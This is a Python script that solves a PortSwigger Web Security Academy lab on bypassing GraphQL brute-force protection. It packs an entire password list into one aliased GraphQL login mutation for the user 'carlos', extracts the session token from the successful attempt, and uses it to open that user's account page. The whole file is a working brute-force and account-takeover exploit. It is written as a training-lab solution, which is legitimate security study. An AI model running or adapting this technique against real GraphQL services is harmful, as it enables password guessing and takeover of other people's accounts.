##########################################################
#
# Lab: Bypassing GraphQL brute force protections
#
# Hack Steps:
#      1. Read password list
#      2. Try all passwords for carlos in the same query
#      3. Extract carlos token from the success attempt
#      4. Fetch carlos profile
#
##########################################################
import requests
import re
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a2700f904a02aa0855508fd009100bd.web-security-academy.net"

def main():
    print("⦗1⦘ Reading password list.. ", end="", flush=True)

    password_list = read_password_list("../passwords.txt") # Make sure the file exist in your root directory or change its path accordingly

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Trying all passwords for carlos in the same query.. ", end="", flush=True)

    query_result = try_multiple_passwords_to_login(password_list)       

    print(Fore.GREEN + "OK")
    # print(query_result.text)
    print(Fore.WHITE + "⦗3⦘ Extracting carlos token from the success attempt.. ", end="", flush=True)

    carlos_token = re.findall(r"\"token\": \"(\w*)\",\s*\"success\": true", query_result.text)[0]

    print(Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + carlos_token)
    print(Fore.WHITE + "⦗4⦘ Fetching carlos profile.. ", end="", flush=True)        
    
    cookies = { "session": carlos_token }
    fetch("/my-account", cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def read_password_list(file_path):
    try:
        return open(file_path, 'rt').read().splitlines()
    except:
        print(Fore.RED + "⦗!⦘ Failed to opent the file " + file_path + " through exception")
        exit(1)


def try_multiple_passwords_to_login(password_list):
    attempts = build_attempts(password_list)
    mutation = f"mutation login {{ {attempts} }}"
    json = { "query": mutation, "operationName": "login"}
    return post_data("/graphql/v1", json) 


def build_attempts(password_list):
    attempts = []
    for (index, password) in enumerate(password_list):
        to_append = f"""attempt{index+1}:login(input: {{ username: "carlos", password: "{password}" }}) {{
                        token
                        success
                    }}\n"""
        attempts.append(to_append)
    return "".join(attempts)


def post_data(path, json = None):
    try:    
        return requests.post(f"{LAB_URL}{path}", json=json, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)


def fetch(path, cookies):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)        


if __name__ == "__main__":
    main()

